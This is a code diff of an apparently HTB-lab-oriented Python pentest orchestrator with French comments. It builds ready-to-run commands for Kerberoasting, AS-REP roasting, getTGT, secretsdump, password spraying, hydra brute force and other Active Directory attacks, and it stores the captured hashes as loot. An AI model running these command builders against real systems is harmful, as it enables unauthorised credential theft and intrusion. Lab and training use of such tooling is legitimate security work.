@@ -5,7 +5,7 @@ HTB Toolbox v1 — Backend
 """
 
 import asyncio, fcntl, json, os, pty, re, shlex, shutil, signal, subprocess, sys, termios, time
-from datetime import datetime
+from datetime import datetime, timezone
 from pathlib import Path
 
 try:
@@ -103,6 +103,7 @@ CONFIG_PERSIST_KEYS = (
     "domain",
     "dc",
     "user",
+    "target_account",
     "claude_api_key",
     "web_port",
     "ssh_port",
@@ -123,6 +124,7 @@ def default_config() -> dict:
         "sudo_password": "",
         "nt_hash": "",
         "ccache": "",
+        "target_account": "",
         "claude_api_key": "",
         "web_port": "80",
         "ssh_port": "22",
@@ -163,7 +165,13 @@ def mask_text(text: str, *secrets: str, strip_ansi: bool = True) -> str:
 
 
 def build_shell_env(cfg: dict) -> dict:
-    env = {**os.environ, "TERM": "xterm-256color", "PYTHONUNBUFFERED": "1"}
+    env = {
+        **os.environ,
+        "TERM": "xterm-256color",
+        "PYTHONUNBUFFERED": "1",
+        # Silence les DeprecationWarning crachés par cryptography/spnego via Impacket.
+        "PYTHONWARNINGS": os.environ.get("PYTHONWARNINGS") or "ignore::DeprecationWarning",
+    }
     if cfg.get("target"): env["TARGET"] = cfg["target"]
     if cfg.get("domain"): env["DOMAIN"] = cfg["domain"]
     if cfg.get("dc"): env["DC"] = cfg["dc"]
@@ -172,6 +180,12 @@ def build_shell_env(cfg: dict) -> dict:
     if cfg.get("sudo_password"): env["SUDO_PASS"] = cfg["sudo_password"]
     if cfg.get("nt_hash"): env["AD_NT_HASH"] = cfg["nt_hash"]
     if cfg.get("ccache"): env["KRB5CCNAME"] = cfg["ccache"]
+    # Auto-injection de KRB5_CONFIG si krb5_setup a été lancé (fichier local dans loot/)
+    dom_for_krb = cfg.get("domain") or ""
+    if dom_for_krb:
+        krb_path = LOOT_DIR / output_key(dom_for_krb) / "attack_checks" / "krb5.conf"
+        if krb_path.is_file():
+            env["KRB5_CONFIG"] = str(krb_path)
     env["PS1"] = r"\[\e[1;36m\]htbtoolbox\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ "
     return env
 
@@ -182,20 +196,6 @@ def display_command(cmd: list[str], cfg: dict, pw: str, nt: str, sp: str) -> str
 
     if len(cmd) >= 3 and cmd[0] in ("bash", "sh") and cmd[1] == "-c":
         body = mask(cmd[2])
-        phase_match = re.search(r"&&\s*([A-Za-z0-9_]+)\s+2>&1\s*$", body)
-        if "source " in body and "htbtoolbox_init_web" in body and phase_match:
-            ctx = []
-            if cfg.get("target"):
-                ctx.append(f"target={cfg['target']}")
-            if cfg.get("domain"):
-                ctx.append(f"domain={cfg['domain']}")
-            if cfg.get("dc"):
-                ctx.append(f"dc={cfg['dc']}")
-            if cfg.get("user"):
-                ctx.append(f"user={cfg['user']}")
-            auth = "ccache" if cfg.get("ccache") else "nt_hash" if cfg.get("nt_hash") else "password" if cfg.get("password") else "anonymous"
-            ctx.append(f"auth={auth}")
-            return f"htbtoolbox.sh :: {phase_match.group(1)} ({', '.join(ctx)})"
         return f'bash -c "{body}"'
     return mask(" ".join(cmd))
 
@@ -208,12 +208,10 @@ async def sync_hosts_with_script(cfg: dict) -> tuple[bool, str]:
     if not cfg.get("domain") and not cfg.get("dc"):
         return False, "domaine/DC manquant"
 
-    out_dir = get_output_dir(cfg.get("domain", ""))
     env_parts = [
         shell_assign("TARGET", cfg.get("target", "")),
         shell_assign("DOMAIN", cfg.get("domain", "")),
         shell_assign("DC", cfg.get("dc", "")),
-        shell_assign("OUTDIR", str(out_dir)),
         "AUTO_HOSTS=1",
         shell_assign("SUDO_PASS", cfg.get("sudo_password", "")),
     ]
@@ -221,9 +219,6 @@ async def sync_hosts_with_script(cfg: dict) -> tuple[bool, str]:
     body = (
         "set -o pipefail; export " + " ".join(env_parts) + "; "
         + f"source {script} >/dev/null 2>&1 && "
-        + "htbtoolbox_init_tooling >/dev/null 2>&1 && "
-        + "validate_config >/dev/null 2>&1 && "
-        + "setup_output_dir >/dev/null 2>&1 && "
         + "setup_hosts 2>&1"
     )
     proc = await asyncio.create_subprocess_exec(
@@ -319,6 +314,106 @@ async def cleanup_tool_processes(tool_id: str | None) -> None:
         await asyncio.sleep(0.2)
 
 
+TOOL_TIMEOUT_BUDGETS: dict[str, int] = {
+    # Recon / enumeration
+    "rustscan_fast": 180,
+    "nmap_targeted": 420,
+    "snmp_enum": 120,
+    "ftp_enum": 120,
+    "web_enum": 180,
+    "dns_enum": 120,
+    "nxc_anon_probe": 60,
+    "smbclient_list": 90,
+    "nxc_smb_passpol": 90,
+    "smb_loot": 180,
+    "ldap_users_auth": 120,
+    "ldap_kerberoastable": 120,
+    "ldap_asrep_candidates": 120,
+    "ldapdomaindump": 420,
+    "ldaps_probe": 90,
+    "kerbrute_userenum": 90,
+    "getnpusers_asrep": 120,
+    "getuserspns_kerberoast": 120,
+    "gettgt": 120,
+    "krb5_setup": 120,
+    "nxc_smb_auth_test": 90,
+    "certipy_find": 240,
+    "certipy_ca": 180,
+    "certipy_shadow": 240,
+    "enum4linux_ng": 420,
+    "rpcclient_enum": 120,
+    "bloodhound_collect": 600,
+    "secretsdump": 420,
+    "bloodyad_acls": 180,
+    "pre2k_check": 120,
+    "gmsa_extract": 180,
+    "forcechangepwd": 120,
+    "spnjacking_enum": 180,
+    "rbcd_check": 180,
+    "dacledit_read": 180,
+    "owneredit_read": 180,
+    "addcomputer": 180,
+    "shadowcred_pkinit_chain": 600,
+    "bloodyad_shadow_add": 180,
+    "coercer_run": 180,
+    # Web / SQL
+    "web_robots": 120,
+    "web_tech_detect": 120,
+    "web_dir_quick": 420,
+    "web_nuclei_safe": 600,
+    "smbmap_enum": 420,
+    "ffuf_vhost": 600,
+    "ffuf_dir_fast": 600,
+    "wfuzz_params": 600,
+    "nikto_scan": 900,
+    "waf_detect": 180,
+    "cms_scan": 300,
+    "lfi_probe": 240,
+    "sqlmap_basic": 900,
+    "web_login_brute": 600,
+    "mysql_probe": 240,
+    "mssql_probe": 240,
+    "postgres_probe": 240,
+    "redis_probe": 120,
+    "mongodb_probe": 120,
+    "sqlmap_crawl": 1200,
+    # Linux
+    "hydra_ssh": 900,
+    "sudo_enum": 120,
+    "suid_sgid_find": 180,
+    "linux_caps_check": 180,
+    "linux_cron_check": 180,
+    "linux_services_enum": 180,
+    "linux_privesc_check": 900,
+    "pspy_monitor": 180,
+    "linux_docker_check": 180,
+    "linux_http_fingerprint": 120,
+    "tls_probe": 180,
+    "ssh_banner": 120,
+    "ssh_auth_methods": 120,
+    "nfs_probe": 180,
+    # Misc
+    "adfs_probe": 180,
+    "ldap_constrained_deleg": 180,
+    "ldap_gmsa_readable": 180,
+    "ntp_sync": 90,
+    "hosts_autoconf": 90,
+    "smb_signing": 90,
+    "winrm_checks": 120,
+    "password_spray": 300,
+    "socat_fwd": 180,
+}
+
+
+def apply_timeout_budget(tool_id: str, cmd: list[str]) -> tuple[list[str], int | None]:
+    secs = TOOL_TIMEOUT_BUDGETS.get(tool_id)
+    if not secs or not shutil.which("timeout"):
+        return cmd, None
+    if len(cmd) >= 3 and cmd[0] == "bash" and cmd[1] == "-c":
+        return ["bash", "-c", f"exec timeout --foreground {secs}s bash -c {shell_quote(cmd[2])}"], secs
+    return ["timeout", "--foreground", f"{secs}s", *cmd], secs
+
+
 async def terminate_named_runs(tool_ids: list[str]) -> None:
     for tool_id in tool_ids:
         proc = active_run_procs.get(tool_id)
@@ -359,7 +454,7 @@ def load_profiles_catalog() -> dict:
 def runtime_info() -> dict:
     return {
         "host_os": "linux",
-        "script_mode": "htbtoolbox.sh" if script_available() else "fallback",
+        "script_mode": "utilitaires" if script_available() else "absent",
         "supports": ["windows", "linux", "web", "hybrid"],
         "tools": check_tools(),
     }
@@ -1788,6 +1883,47 @@ def extract_loot_structured_intel(out_dir: Path) -> dict:
         ".txt", ".log", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
         ".ps1", ".bat", ".cmd", ".vbs", ".csv", ".md",
     }
+    # Extensions fréquemment captées par le pattern host et qui ne sont pas des hôtes.
+    FILE_EXT_TOKENS = {
+        "log", "ini", "conf", "config", "txt", "xml", "json", "yaml", "yml",
+        "ps1", "ps2", "bat", "cmd", "vbs", "csv", "md", "dll", "exe", "bak",
+        "tmp", "cfg", "reg", "pem", "pfx", "crt", "key", "lnk", "url", "db",
+    }
+    # Domaines publics à ignorer (pollution classique dans les logs).
+    PUBLIC_DOMAINS = {
+        "github.com", "gitlab.com", "bitbucket.org", "gmail.com", "google.com",
+        "googleapis.com", "microsoft.com", "office.com", "outlook.com",
+        "windows.com", "live.com", "microsoftonline.com", "azure.com",
+        "schemas.microsoft.com", "wikipedia.org", "example.com", "localhost",
+    }
+    # TLD internes raisonnables pour un AD.
+    INTERNAL_TLDS = {"htb", "local", "corp", "internal", "intra", "lab", "loc", "lan", "test"}
+    # Préfixes de classes .NET ou namespaces à éliminer.
+    NAMESPACE_PREFIXES = ("system.", "microsoft.", "mscorlib.", "java.", "com.sun.", "org.apache.")
+    target_domain = str(getattr(out_dir, "name", "") or "").strip().lower()
+
+    def looks_like_host(raw: str) -> bool:
+        if not raw or raw.startswith("_") or raw.count(".") == 0:
+            return False
+        parts = raw.split(".")
+        last = parts[-1]
+        if last in FILE_EXT_TOKENS:
+            return False
+        if raw in PUBLIC_DOMAINS:
+            return False
+        if any(raw.endswith("." + d) for d in PUBLIC_DOMAINS):
+            return False
+        if raw.startswith(NAMESPACE_PREFIXES):
+            return False
+        # Si le domaine cible est connu (typique HTB), on exige ce suffixe : filtre le plus fiable.
+        if target_domain and "." in target_domain:
+            return raw == target_domain or raw.endswith("." + target_domain)
+        # Sinon on accepte les TLD internes reconnus.
+        if last in INTERNAL_TLDS:
+            return True
+        # Sinon on limite à 2-3 segments avec un TLD court alpha pour écarter les namespaces .NET.
+        return len(parts) <= 3 and bool(re.match(r"^[a-z]{2,4}$", last))
+
     seen_creds: set[tuple[str, str, str]] = set()
     seen_hosts: set[str] = set()
     seen_findings: set[tuple[str, str, str]] = set()
@@ -1819,7 +1955,7 @@ def extract_loot_structured_intel(out_dir: Path) -> dict:
             key = raw
         else:
             raw = raw.lower()
-            if "." not in raw or raw.startswith("_"):
+            if not looks_like_host(raw):
                 return
             key = raw
         if key in seen_hosts:
@@ -3300,6 +3436,50 @@ async def query_ntp_offset(target: str, timeout: float = 8) -> tuple[float | Non
     except Exception:
         return None, ""
 
+def build_stat_paths(out_dir: Path, domain: str) -> dict:
+    """Construit les chemins loot canoniques pour les cartes de stats.
+    Renvoie un dict stat_key → chemin relatif à LOOT_DIR (ou None si absent).
+    """
+    key = output_key(domain)
+    def first_existing(*candidates: str) -> str | None:
+        for rel in candidates:
+            if (out_dir / rel).exists():
+                return f"{key}/{rel}"
+        return None
+
+    return {
+        "users": first_existing(
+            "ldapdomaindump/domain_users.html",
+            "ldapdomaindump/domain_users.json",
+            "ldap_users_auth.txt",
+            "users.txt",
+        ),
+        "groups": first_existing(
+            "ldapdomaindump/domain_groups.html",
+            "ldapdomaindump/domain_groups.json",
+        ),
+        "asrep": first_existing("kerberos/asrep_hashes.txt"),
+        "kerb":  first_existing("kerberos/tgs_hashes.txt"),
+        "ntlm":  first_existing(
+            "attack_checks/secretsdump_dcsync.txt",
+            "secretsdump_ntlm.txt",
+        ),
+        "signing": first_existing("attack_checks/smb_signing_check.txt"),
+        "winrm": first_existing(
+            "attack_checks/winrm_auth_test.txt",
+            "attack_checks/winrm_wsman_5985_headers.txt",
+            "attack_checks/winrm_wsman_5986_headers.txt",
+        ),
+        "adcs": first_existing(
+            "adcs/certipy_find.log",
+            "adcs/certipy_find.txt",
+            "adcs/certipy.json",
+        ),
+        "klist": first_existing("kerberos/klist.txt"),
+        "ccache_dir": f"{key}/attack_checks" if (out_dir / "attack_checks").exists() else None,
+    }
+
+
 def summarize_domain_results(domain: str) -> dict:
     out_dir = get_output_dir(domain)
     summary = {
@@ -3617,6 +3797,7 @@ def summarize_domain_results(domain: str) -> dict:
     summary["operational"] = collect_operational_view(out_dir, domain, summary)
     summary["contexts"] = detect_loot_contexts(out_dir, summary)
     summary["layout"] = build_results_layout(summary, summary["contexts"])
+    summary["stat_paths"] = build_stat_paths(out_dir, domain)
     ntp_file = out_dir / "attack_checks" / "ntp_sync.txt"
     if ntp_file.exists():
         ntp_text = safe_read_text(ntp_file, 12000)
@@ -3903,7 +4084,7 @@ def persist_run_manifest(cfg: dict, manifest: dict) -> Path:
     manifest_dir = parsed_dir / "manifests"
     parsed_dir.mkdir(parents=True, exist_ok=True)
     manifest_dir.mkdir(exist_ok=True)
-    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
     safe_name = SAFE_OUTPUT_RE.sub("_", cfg.get("domain") or cfg.get("target") or "run").strip("_") or "run"
     manifest_path = manifest_dir / f"{ts}_{safe_name}.json"
     payload = {
@@ -3928,6 +4109,11 @@ def _find(*bins) -> str | None:
 def get_nxc()      -> str: return _find("nxc","crackmapexec") or "nxc"
 def get_certipy()  -> str: return _find("certipy-ad","certipy") or "certipy-ad"
 def get_bloodyad() -> str: return _find("bloodyAD","bloodyad") or "bloodyAD"
+def get_pkinittools_dir() -> str:
+    local_dir = BASE_DIR / "PKINITtools"
+    if local_dir.is_dir():
+        return str(local_dir)
+    return str(BASE_DIR / "PKINITtools")
 def get_impacket(tool: str) -> str:
     variants = {
         "GetNPUsers":  ["impacket-GetNPUsers","impacket-getnpusers"],
@@ -3957,7 +4143,7 @@ def shell_assign(name: str, value: str) -> str:
 
 def normalize_cfg(cfg: dict) -> dict:
     cleaned = {}
-    for key in ("ui_language", "target", "user", "password", "sudo_password", "domain", "dc", "nt_hash", "ccache", "target_type", "op_mode"):
+    for key in ("ui_language", "target", "user", "password", "sudo_password", "domain", "dc", "nt_hash", "ccache", "target_type", "op_mode", "target_account"):
         val = cfg.get(key, "")
         if val is None:
             val = ""
@@ -4033,38 +4219,6 @@ def normalize_loot_section_paths(out_dir: Path, sections: list[dict]) -> list[di
     return normalized
 
 # ── Map tool_id → fonction du script ──────────────────────────────────
-SCRIPT_PHASES = {
-    "nmap_baseline":           ("phase_nmap_baseline",      "NMAP_SCAN=1"),
-    "smb_signing":             ("phase_smb_signing_check",  "SMB_SIGNING=1"),
-    "ntp_sync":                ("phase_ntp_sync",           "NTP_SYNC=1"),
-    "snmp_enum":               ("phase_snmp_enum",          "SNMP_ENUM=1"),
-    "ftp_enum":                ("phase_ftp_enum",           "FTP_ENUM=1"),
-    "web_enum":                ("phase_web_enum",           "WEB_ENUM=1"),
-    "dns_enum":                ("phase_dns_enum",           "DNS_ENUM=1"),
-    "ldap_anon_base":          ("phase_ldap_anon_base",     ""),
-    "ldap_users_auth":         ("phase_ldap_users_auth",    ""),
-    "ldap_kerberoastable":     ("phase_ldap_kerberoastable",""),
-    "ldap_asrep_candidates":   ("phase_ldap_asrep_candidates",""),
-    "ldapdomaindump":          ("phase_ldapdomaindump",     "LDAPDOMAINDUMP=1"),
-    "ldaps_probe":             ("phase_ldaps_enum",         "LDAPS_ENUM=1"),
-    "enum4linux_ng":           ("enum4linux_phase",         "ENUM4LINUX=1"),
-    "rpcclient_enum":          ("rpc_enum",                 ""),
-    "winrm_checks":           ("phase_winrm_checks",       "WINRM_CHECK=1"),
-    "bloodhound_collect":      ("phase_bloodhound_collect", "BLOODHOUND=1"),
-    "gettgt":                  ("run_gettgt_auto",          ""),
-    "getnpusers_asrep":        ("merge_and_asrep",          "DO_ASREP=1"),
-    "getuserspns_kerberoast":  ("phase_kerberoast",         "KERBEROAST=1"),
-    "kerbrute_userenum":       ("kerberos_user_enum",       "KERB_USER_ENUM=1"),
-    "certipy_find":            ("phase_certipy_find",       "ADCS_ENUM=1 CERTIPY=1"),
-    "certipy_ca":              ("phase_certipy_ca",         "ADCS_ENUM=1 CERTIPY=1"),
-    "certipy_shadow":          ("phase_certipy_shadow",     "ADCS_ENUM=1 CERTIPY=1"),
-    "bloodyad_acls":           ("phase_bloodyad_checks",    "BLOODYAD_ENUM=1 BLOODYAD=1"),
-    "gpo_parse":               ("phase_gpo_parse",          "GPO_PARSE=1"),
-    "secretsdump":             ("phase_secretsdump",        "SECRETSDUMP=1"),
-    "hash_hints":              ("phase_hash_crack_hints",   "HASH_HINTS=1"),
-        "postauth_hints":          ("phase_postauth_hints",     "POSTAUTH_HINTS=1"),
-}
-
 def build_command(tool_id: str, cfg: dict) -> list[str] | None:
     cfg = normalize_cfg(cfg)
     t  = cfg.get("target","")
@@ -4075,6 +4229,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
     dc = cfg.get("dc", f"DC01.{d}" if d else "")
     nt = cfg.get("nt_hash","")
     cc = cfg.get("ccache","")
+    ta = cfg.get("target_account","")
     out = str(get_output_dir(d))
     dn  = ",".join(f"DC={x}" for x in d.split(".")) if d else ""
     nxc = get_nxc()
@@ -4083,7 +4238,8 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
     qt, qu, qp = shell_quote(t), shell_quote(u), shell_quote(p)
     qd, qdc, qnt = shell_quote(d), shell_quote(dc), shell_quote(nt)
     qcc, qout, qdn = shell_quote(cc), shell_quote(out), shell_quote(dn)
-    qscript = shell_quote(str(SCRIPT_PATH))
+    qpkdir = shell_quote(get_pkinittools_dir())
+    qta = shell_quote(ta)
     # Web URL with configurable port
     if wp in ("443","8443"):
         web_url = f"https://{t}" if wp == "443" else f"https://{t}:{wp}"
@@ -4107,42 +4263,7 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
         else:
             return f"echo '[!] User SSH requis'; echo 'Commande à exécuter sur la cible :'; echo {shell_quote(cmd)}"
 
-    def auth_mode_num() -> str:
-        return "1" if (u and (p or nt or cc)) else "0"
-
-    # ── Via script bash ────────────────────────────────────────────────
-    if script_available() and tool_id in SCRIPT_PHASES:
-        phase, flags = SCRIPT_PHASES[tool_id]
-        env_parts = [
-            shell_assign("TARGET", t),
-            shell_assign("DOMAIN", d),
-            shell_assign("DC", dc),
-            shell_assign("OUTDIR", out),
-            f"AUTH_MODE={auth_mode_num()}",
-            shell_assign("AD_USER_RAW", u),
-            shell_assign("AD_PASS", p),
-            shell_assign("AD_USER_BEST", u),
-            ("AUTO_HOSTS=1" if t and d and dc else "AUTO_HOSTS=0"), "NMAP_SCAN=0", "BLOODHOUND=0", "DO_ASREP=0",
-            "KERBEROAST=0", "ADCS_ENUM=0", "BLOODYAD_ENUM=0", "MSSQL_ENUM=0",
-            "GPO_PARSE=0", "SECRETSDUMP=0", "HASH_HINTS=0", "POSTAUTH_HINTS=0",
-            "ENUM4LINUX=0", "LDAPDOMAINDUMP=0", "DNS_ENUM=0", "KERB_USER_ENUM=0",
-            "SMB_SIGNING=0", "SNMP_ENUM=0", "FTP_ENUM=0", "WEB_ENUM=0",
-            "NTP_SYNC=0", "LDAPS_ENUM=0",
-        ]
-        if cc:
-            env_parts.append(shell_assign("KRB5CCNAME", cc))
-        if nt:
-            env_parts.append(shell_assign("AD_NT_HASH", nt))
-        if sp:
-            env_parts.append(shell_assign("SUDO_PASS", sp))
-        env_parts.append("HTB_WEB_FAST_INIT=1")
-        if flags:
-            env_parts.append(flags)
-        return ["bash","-c",
-                f"set -o pipefail; export {' '.join(env_parts)}; "
-                f"source {qscript} 2>/dev/null && htbtoolbox_init_web >/dev/null 2>&1 && {phase} 2>&1"]
-
-    # ── Mode de repli : commandes directes ─────────────────────────────
+    # ── Commandes directes (source unique de vérité : Python) ─────────
     def nxc_smb() -> str:
         base = f"{shell_quote(nxc)} smb {qt}"
         if cc:   return f"KRB5CCNAME={qcc} {base} --use-kcache"
@@ -4233,8 +4354,29 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"nmap -p 445 --script smb2-security-mode {qt} 2>&1"
         ] if t else None,
 
+        "winrm_checks": ["bash","-c",
+            f"mkdir -p {qout}/attack_checks; "
+            f"echo '=== WinRM 5985 /wsman ==='; "
+            f"curl -skI --max-time 6 http://{t}:5985/wsman 2>&1 "
+            f"| tee {qout}/attack_checks/winrm_wsman_5985_headers.txt; "
+            f"echo ''; echo '=== WinRM 5986 /wsman (TLS) ==='; "
+            f"curl -skI --max-time 6 https://{t}:5986/wsman 2>&1 "
+            f"| tee {qout}/attack_checks/winrm_wsman_5986_headers.txt"
+            + (f"; echo ''; echo '=== nxc winrm auth ==='; "
+               + (f"KRB5CCNAME={qcc} {shell_quote(nxc)} winrm {qt} -u {qu} -d {qd} --use-kcache"
+                  if cc else
+                  f"{shell_quote(nxc)} winrm {qt} -u {qu} -H {qnt} -d {qd}"
+                  if nt else
+                  f"{shell_quote(nxc)} winrm {qt} -u {qu} -p {qp} -d {qd}")
+               + f" 2>&1 | tee {qout}/attack_checks/winrm_auth_test.txt"
+               if u and (p or nt or cc) else "")
+        ] if t else None,
+
         "ntp_sync": ["bash","-c",
-            f"ntpdate -q {qdc} 2>&1 | head -5; ntpdate -q {qt} 2>&1 | head -5"
+            + (f"printf '%s\\n' {shell_quote(sp)} | sudo -S -p '' timedatectl set-ntp false 2>/dev/null || true; "
+               if sp else
+               "sudo -n timedatectl set-ntp false 2>/dev/null || true; ")
+            + f"ntpdate -q {qdc} 2>&1 | head -5; ntpdate -q {qt} 2>&1 | head -5"
         ] if t else None,
 
         "snmp_enum": ["bash","-c",
@@ -4324,7 +4466,9 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
         "kerbrute_userenum": ["bash","-c",
             f"WLIST=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt; "
             f"[ -f $WLIST ] || WLIST=/usr/share/wordlists/rockyou.txt; "
-            f"kerbrute userenum -d {qd} --dc {qt} "
+            f"TIMEOUT_BIN=$(command -v timeout || true); "
+            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 90s }}; "
+            f"${{RUNNER}}kerbrute userenum -d {qd} --dc {qt} "
             f"<(head -n 5000 $WLIST) 2>&1 | tee {qout}/kerbrute_userenum.txt | head -80"
         ] if t and d and shutil.which("kerbrute") else None,
 
@@ -4333,10 +4477,12 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"command -v $TOOL >/dev/null || {{ echo 'GetNPUsers introuvable'; exit 1; }}; "
             f"mkdir -p {qout}/kerberos; "
             f"UFILE={qout}/users.txt; [ -f $UFILE ] || echo {qu} > $UFILE; "
-            + (f"KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
+            f"TIMEOUT_BIN=$(command -v timeout || true); "
+            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
+            + (f"${{RUNNER}}env KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
                f"-usersfile $UFILE 2>&1 | tee {qout}/kerberos/asrep_hashes.txt"
                if cc else
-               f"$TOOL {shell_quote(f'{d}/')} -dc-ip {qt} -no-pass -usersfile $UFILE 2>&1 "
+               f"${{RUNNER}}$TOOL {shell_quote(f'{d}/')} -dc-ip {qt} -no-pass -usersfile $UFILE 2>&1 "
                f"| tee {qout}/kerberos/asrep_hashes.txt")
         ] if t and d else None,
 
@@ -4344,24 +4490,306 @@ def build_command(tool_id: str, cfg: dict) -> list[str] | None:
             f"TOOL={shell_quote(get_impacket('GetUserSPNs'))}; "
             f"command -v $TOOL >/dev/null || {{ echo 'GetUserSPNs introuvable'; exit 1; }}; "
             f"mkdir -p {qout}/kerberos; "
-            + (f"KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
+            f"TIMEOUT_BIN=$(command -v timeout || true); "
+            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
+            + (f"${{RUNNER}}env KRB5CCNAME={qcc} $TOOL {shell_quote(f'{d}/{u}')} -dc-ip {qt} -k -no-pass "
                f"-request -outputfile {qout}/kerberos/tgs_hashes.txt 2>&1"
                if cc else
-               f"$TOOL {shell_quote(f'{d}/{u}:{p}')} -dc-ip {qt} "
+               f"${{RUNNER}}$TOOL {shell_quote(f'{d}/{u}:{p}')} -dc-ip {qt} "
                f"-request -outputfile {qout}/kerberos/tgs_hashes.txt 2>&1"
                if u else "echo 'Credentials requis'")
         ] if t and d else None,
 
         "gettgt": ["bash","-c",
             f"TOOL={shell_quote(get_impacket('getTGT'))}; "
-            f"command -v $TOOL >/dev/null || {{ echo 'getTGT introuvable'; exit 1; }}; "
-            f"mkdir -p {qout}/attack_checks; "
-            + (f"$TOOL {shell_quote(f'{d.upper()}/{u}')} -hashes {shell_quote(':' + nt)} -dc-ip {qt} 2>&1"
+            f"command -v $TOOL >/dev/null || {{ echo '[!] getTGT introuvable — apt install python3-impacket'; exit 1; }}; "
+            f"mkdir -p {qout}/attack_checks {qout}/kerberos; "
+            f"CC_DEST={qout}/attack_checks/{shell_quote(f'{u}.ccache')}; "
+            f"KLIST_FILE={qout}/kerberos/klist.txt; "
+            f"TIMEOUT_BIN=$(command -v timeout || true); "
+            f"RUNNER=${{TIMEOUT_BIN:+$TIMEOUT_BIN --foreground 120s }}; "
+            f"echo '=== getTGT ({d.upper()}/{u}) ==='; "
+            + (f"echo '[*] timedatectl set-ntp false'; "
+               f"printf '%s\\n' {shell_quote(sp)} | sudo -S -p '' timedatectl set-ntp false 2>/dev/null || true; "
+               if sp else
+               "echo '[*] timedatectl set-ntp false'; sudo -n timedatectl set-ntp false 2>/dev/null || true; ")
+            + f"echo '[*] Si Kerberos échoue encore, lance d abord krb5_setup pour forcer la sync NTP sur le DC.'; "
+            + (f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}')} -hashes {shell_quote(':' + nt)} -dc-ip {qt} 2>&1"
                if nt else
-               f"$TOOL {shell_quote(f'{d.upper()}/{u}:{p}')} -dc-ip {qt} 2>&1"
-               if u else "echo 'Credentials requis'")
-            + f"; [ -f {shell_quote(f'{u}.ccache')} ] && mv {shell_quote(f'{u}.ccache')} {qout}/attack_checks/ 2>/dev/null || true"
+               f"${{RUNNER}}$TOOL {shell_quote(f'{d.upper()}/{u}:{p}')} -dc-ip {qt} 2>&1"
+               if u else "echo '[!] Credentials requis (user+pass ou user+NT)'; exit 1")
+            + f"; CC_SRC=$(ls -t {shell_quote(f'{u}.ccache')} 2>/dev/null | head -1); "
+            f"if [ -n \"$CC_SRC\" ] && [ -f \"$CC_SRC\" ]; then "
+            f"  mv \"$CC_SRC\" \"$CC_DEST\" 2>/dev/null || cp \"$CC_SRC\" \"$CC_DEST\"; "
+            f"  echo ''; echo '=== ccache stocké ==='; echo \"$CC_DEST\"; "
+            f"  echo ''; echo '=== klist (persisté dans kerberos/klist.txt) ==='; "
+            f"  {{ echo '# klist pour $CC_DEST — '$(date -Iseconds); KRB5CCNAME=\"$CC_DEST\" klist 2>&1; echo ''; }} | tee -a \"$KLIST_FILE\"; "
+            f"  echo ''; echo '=== Prochaines étapes (à copier/coller) ==='; "
+            f"  echo \"export KRB5CCNAME=$CC_DEST\"; "
+            f"  echo 'Puis colle ce chemin dans le champ ccache de l UI pour que tous les outils l utilisent (-k).'; "
+            f"else echo ''; echo '[!] Aucun .ccache généré — vérifie le mot de passe / NT-hash / temps DC (ntpdate).'; fi"
+        ] if t and d and u else None,
+
+        "klist_show": ["bash","-c",
+            f"mkdir -p {qout}/kerberos; "
+            f"KLIST_FILE={qout}/kerberos/klist.txt; "
+            f"echo '=== Scan ccache dans attack_checks/ ==='; "
+            f"CCACHES=$(ls {qout}/attack_checks/*.ccache 2>/dev/null); "
+            f"if [ -z \"$CCACHES\" ]; then "
+            f"  echo '[!] Aucun .ccache trouvé — lance d abord l outil getTGT.'; "
+            f"  [ -n \"$KRB5CCNAME\" ] && echo \"[*] Fallback : KRB5CCNAME courant = $KRB5CCNAME\" && klist 2>&1 | tee \"$KLIST_FILE\"; "
+            f"  exit 0; "
+            f"fi; "
+            f"> \"$KLIST_FILE\"; "
+            f"for cc in $CCACHES; do "
+            f"  {{ echo \"# klist pour $cc — $(date -Iseconds)\"; KRB5CCNAME=\"$cc\" klist 2>&1; echo ''; }} | tee -a \"$KLIST_FILE\"; "
+            f"done; "
+            f"echo ''; echo '=== Fichier loot : kerberos/klist.txt ==='; "
+            f"echo '[+] ' $(grep -c '^#' \"$KLIST_FILE\") ' ccache(s) dumped into klist.txt'"
+        ],
+
+        "krb5_setup": ["bash","-c",
+            f"mkdir -p {qout}/attack_checks; "
+            f"KRB_FILE={qout}/attack_checks/krb5.conf; "
+            f"REALM={shell_quote(d.upper())}; "
+            f"DC_HOST={shell_quote(dc if dc else f'DC01.{d}')}; "
+            f"SUDO={shell_quote(sp)}; "
+            # SUDO_RUN exécute une commande; SUDO_SH exécute une commande shell (supporte redirections/pipes).
+            # On isole le mot de passe pour qu'il ne soit jamais écrasé par un stdin pipé.
+            f"SUDO_RUN() {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' \"$@\"; else sudo -n \"$@\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
+            f"SUDO_SH()  {{ if [ -n \"$SUDO\" ]; then printf '%s\\n' \"$SUDO\" | sudo -S -p '' bash -c \"$1\"; else sudo -n bash -c \"$1\" 2>/dev/null || {{ echo '[~] sudo non disponible sans mot de passe — étape ignorée'; return 1; }}; fi; }}; "
+            f"echo '=== 1/4 Génération krb5.conf ==='; "
+            f"{shell_quote(nxc)} smb {qt} --generate-krb5-file \"$KRB_FILE\" 2>&1 | tail -5 || true; "
